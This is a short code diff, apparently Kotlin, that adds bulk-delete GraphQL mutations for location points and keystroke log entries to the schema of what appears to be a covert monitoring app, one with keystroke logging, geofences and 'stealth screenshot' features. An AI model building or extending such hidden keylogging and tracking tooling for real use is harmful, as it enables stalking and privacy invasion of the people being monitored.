@@ -269,6 +269,14 @@ fun SchemaBuilder.addTrackingSchema() {
         }
     }
 
+    mutation("bulkDeleteLocationPoints") {
+        resolver { fromTs: String, toTs: String, olderThanN: Int ->
+            val from = fromTs.toLongOrNull() ?: 0L
+            val to = toTs.toLongOrNull() ?: 0L
+            LocationTrackingHelper.bulkDelete(from, to, olderThanN)
+        }
+    }
+
     // ---- GEOFENCES ----
 
     query("geofences") {
@@ -406,6 +414,14 @@ fun SchemaBuilder.addTrackingSchema() {
 
     mutation("deleteKeystrokeEntry") {
         resolver { id: String -> KeystrokeLogHelper.deleteOne(id) }
+    }
+
+    mutation("bulkDeleteKeystrokes") {
+        resolver { fromTs: String, toTs: String, packageName: String, olderThanN: Int ->
+            val from = fromTs.toLongOrNull() ?: 0L
+            val to = toTs.toLongOrNull() ?: 0L
+            KeystrokeLogHelper.bulkDelete(from, to, packageName, olderThanN)
+        }
     }
 
     // ---- STEALTH SCREENSHOT ----
